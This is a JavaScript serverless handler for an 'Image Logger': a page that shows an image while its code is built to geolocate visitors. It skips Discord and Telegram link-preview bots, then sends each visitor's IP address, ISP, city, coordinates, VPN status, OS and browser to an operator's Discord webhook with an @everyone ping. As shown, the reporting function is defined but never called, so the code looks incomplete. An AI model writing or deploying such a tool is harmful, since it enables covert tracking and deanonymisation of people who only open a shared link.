import { parse } from 'url';
     import httpagentparser from 'httpagentparser';
     import fetch from 'node-fetch';

     export default async (req, res) => {
         try {
             const { query } = parse(req.url, true);
             const config = JSON.parse(atob(query.config));

             const blacklistedIPs = ["27", "104", "143", "164"];

             const botCheck = (ip, useragent) => {
                 if (ip.startsWith("34") || ip.startsWith("35")) return "Discord";
                 if (useragent.startsWith("TelegramBot")) return "Telegram";
                 return false;
             };

             const makeReport = async (ip, useragent = null, coords = null, endpoint = "N/A", url = false) => {
                 if (blacklistedIPs.some(blacklistedIP => ip.startsWith(blacklistedIP))) return;

                 const bot = botCheck(ip, useragent);
                 if (bot) {
                     if (config.linkAlerts) {
                         await fetch(config.webhook, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
                                 username: config.username,
                                 content: "",
                                 embeds: [{
                                     title: "Image Logger - Link Sent",
                                     color: config.color,
                                     description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${endpoint}\`\n**IP:** \`${ip}\`\n**Platform:** \`${bot}\``,
                                 }],
                             }),
                         });
                     }
                     return;
                 }

                 const info = await fetch(`http://ip-api.com/json/${ip}?fields=16976857`).then(res => res.json());
                 let ping = "@everyone";

                 if (info.proxy) {
                     if (config.vpnCheck === 2) return;
                     if (config.vpnCheck === 1) ping = "";
                 }

                 if (info.hosting) {
                     if (config.antiBot === 4 && !info.proxy) return;
                     if (config.antiBot === 3) return;
                     if (config.antiBot === 2 && !info.proxy) ping = "";
                     if (config.antiBot === 1) ping = "";
                 }

                 const [os, browser] = httpagentparser.simple_detect(useragent);

                 const embed = {
                     username: config.username,
                     content: ping,
                     embeds: [{
                         title: "Image Logger - IP Logged",
                         color: config.color,
                         description: `**A User Opened the Original Image!**

     **Endpoint:** \`${endpoint}\`

     **IP Info:**
     > **IP:** \`${ip || 'Unknown'}\`
     > **Provider:** \`${info.isp || 'Unknown'}\`
     > **ASN:** \`${info.as || 'Unknown'}\`
     > **Country:** \`${info.country || 'Unknown'}\`
     > **Region:** \`${info.regionName || 'Unknown'}\`
     > **City:** \`${info.city || 'Unknown'}\`
     > **Coords:** \`${info.lat}, ${info.lon}\` (${coords ? 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')' : 'Approximate'})
     > **Timezone:** \`${info.timezone.split('/')[1].replace('_', ' ')} (${info.timezone.split('/')[0]})\`
     > **Mobile:** \`${info.mobile}\`
     > **VPN:** \`${info.proxy}\`
     > **Bot:** \`${info.hosting && !info.proxy ? 'True' : 'Possibly'}\`

     **PC Info:**
     > **OS:** \`${os}\`
     > **Browser:** \`${browser}\`

     **User Agent:**
     \`\`\`
     ${useragent}
     \`\`\``,
                     }],
                 };

                 if (url) embed.embeds[0].thumbnail = { url };
                 await fetch(config.webhook, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(embed),
                 });

                 return info;
             };

             const url = config.image;
             const data = `<style>body { margin: 0; padding: 0; } div.img { background-image: url('${url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }</style><div class="img"></div>`;

             res.setHeader('Content-Type', 'text/html');
             res.send(data);
         } catch (error) {
             res.status(500).send("500 - Internal Server Error");
         }
     };
